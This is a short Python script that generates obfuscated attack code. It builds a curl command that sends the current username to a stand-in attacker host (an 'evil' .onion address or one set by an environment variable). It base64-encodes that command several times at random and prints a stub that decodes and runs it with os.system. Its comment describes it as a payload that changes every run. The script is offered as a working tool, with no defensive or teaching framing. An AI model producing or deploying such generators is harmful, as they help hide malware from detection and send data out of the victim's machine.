import random
import base64
import os
from hashlib import sha256

# Generates a random obfuscated python payload every run
def random_payload():
    cmd = f"curl http://{os.getenv('MUTATED_HOST', 'evil.{{RANDOM}}.onion')}/pwned?user=$(whoami)"
    layers = random.randint(2, 5)
    payload = cmd.encode()
    for _ in range(layers):
        payload = base64.b64encode(payload)
    return payload.decode(), layers

def mutate():
    payload, layers = random_payload()
    code = f"import base64,os\nx='{payload}'\n"
    for i in range(layers):
        code += f"x=base64.b64decode(x)\n"
    code += "os.system(x.decode())\n"
    return code

if __name__ == '__main__':
    print(mutate())
